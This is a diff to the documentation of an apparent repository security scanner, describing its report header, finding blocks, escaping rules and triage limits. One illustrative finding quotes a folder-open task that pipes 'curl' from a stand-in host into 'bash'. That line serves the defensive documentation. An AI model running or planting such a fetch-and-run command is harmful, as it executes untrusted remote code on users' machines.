@@ -199,19 +199,42 @@ The exit code follows the same order, and a failed or partial scan can outrank a
 | 1 | No CRITICAL, no failure, and any HIGH |
 | 0 | Anything else |
 
-Next to the verdict the report prints the counts, on one line:
+With `--opened`, the opened warning comes before the verdict. After that the header has these lines, in this order:
 
-```text
-CRITICAL 0  HIGH 1  MEDIUM 2  LOW 0  INFO 5
-```
-
-Then it lists the tools that ran, the ones that did not, and the quarantine folder for a URL. It always ends the header with `No findings is not proof of safety.`
+1. The verdict.
+2. The counts, on one line: `CRITICAL 0  HIGH 1  MEDIUM 2  LOW 0  INFO 5`.
+3. `target:`, what was checked.
+4. `rev:`, the branch, tag or commit. A URL scan only.
+5. `scanned: N files in N ms`.
+6. `skipped:`, the folders the walk skipped, up to 8 and then `… N more`. It appears only when something was skipped.
+7. `partial:`, `a cap stopped the scan before every file was read`. It appears only when a cap stopped the scan.
+8. `error:`, one line for each error, up to 5. It appears only when there was an error.
+9. `tools:`, the optional tools that ran, each with its finding count, or `none`.
+10. One `not run:` line for each optional tool that did not run. It says whether the tool was not on your `PATH` (with what it would add), failed or was skipped, and why.
+11. `quarantine:`, the fetched folder. A URL scan only. It is followed by `To work in it: git -C '<dest>' status`, unless the folder name holds a quote, a control character or a hidden character, or starts with `-`.
+12. `No findings is not proof of safety.`
 
 Findings come next, highest level first. Inside a level, agent findings come before auto-run, then hidden text, payload, exfiltration, dependencies, GuardDog, tools and scanner files, and then by path and line. Each block gives:
 
 - `why`: one sentence on the rule;
-- `seen`: the text found, cut to 160 characters. Hidden characters show as `\u{202E}` style escapes, and a string that looks like a key shows as `<secret:label>`;
+- `seen`: the text found, cut to 160 characters;
 - `do`: one action.
+
+This is an example of one finding block. It is a made-up fixture, not output from a real repo:
+
+```text
+[CRITICAL] F1 autorun.vscode-folder-open .vscode/tasks.json:7 (3 hits)
+  why:  A task runs when the folder opens and fetches a script.
+  seen: curl -s https://example.invalid/p.sh | bash
+  do:   Do not open this folder in an editor or an agent.
+```
+
+The first line holds the level, the finding number, the rule ID, and the file and line. The number matches the `id` in the JSON.
+
+- `(N hits)` appears only when a finding repeats in the same file.
+- A finding about a whole file has no `:line`.
+- Text from the repo is escaped onto one line. A line break and a tab are written out as `\n` and `\t`. Hidden characters show as `\u{202E}` style escapes, and a byte that is not valid UTF-8 shows as `\x{FF}`.
+- A string that looks like a key shows as `<secret:label>`, such as `<secret:github-token>`.
 
 Every CRITICAL and HIGH finding prints. Lower levels print until the report holds 200 blocks, then it says `… N more lower findings: run with --json`.
 
@@ -272,6 +295,8 @@ The notes print under `LLM notes (advisory; cannot lower a finding)`. Their limi
 | `triage` | `nonce`, `about`, `items` (an `id` and an `excerpt` for each finding at MEDIUM or above) and `instructions` (a `path` and an `excerpt` for each file) |
 | `report` | The text report |
 | `notes` | Notes about the run |
+
+At most 200 items go to `triage`. CRITICAL and HIGH findings are never dropped, and a note says how many lower-severity findings were left out.
 
 ## What it cannot see
 
